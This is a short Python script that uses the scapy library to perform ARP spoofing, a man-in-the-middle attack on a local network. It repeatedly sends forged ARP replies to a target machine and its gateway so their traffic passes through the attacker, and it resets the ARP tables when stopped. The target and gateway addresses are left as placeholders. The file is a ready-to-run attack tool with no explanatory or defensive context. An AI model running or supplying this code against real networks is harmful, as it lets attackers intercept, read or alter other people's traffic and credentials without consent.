import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip, target_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip, destination_mac, source_mac):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def get_target_mac(target_ip):
    try:
        target_mac = get_mac(target_ip)
        return target_mac
    except IndexError:
        print("[-] Could not find MAC address of the target. Exiting.")
        sys.exit(1)

def mitm(target_ip, gateway_ip):
    target_mac = get_target_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if target_mac is None:
        print("[-] Could not find MAC address of the target. Exiting.")
        sys.exit(1)
        
    try:
        while True:
            # ARP spoofing the target
            spoof(target_ip, gateway_ip, target_mac)
            
            # ARP spoofing the gateway
            spoof(gateway_ip, target_ip, gateway_mac)
            
            print("\r[+] Sent spoofed ARP packets to the target and gateway"),
            sys.stdout.flush()
            
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Detected Ctrl+C. Restoring ARP tables...")
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        print("[+] ARP tables restored. Exiting.")

target_ip = "x.x.x.x"  # IP of the target machine
gateway_ip = "x.x.x.x"  # IP of the gateway/router

mitm(target_ip, gateway_ip)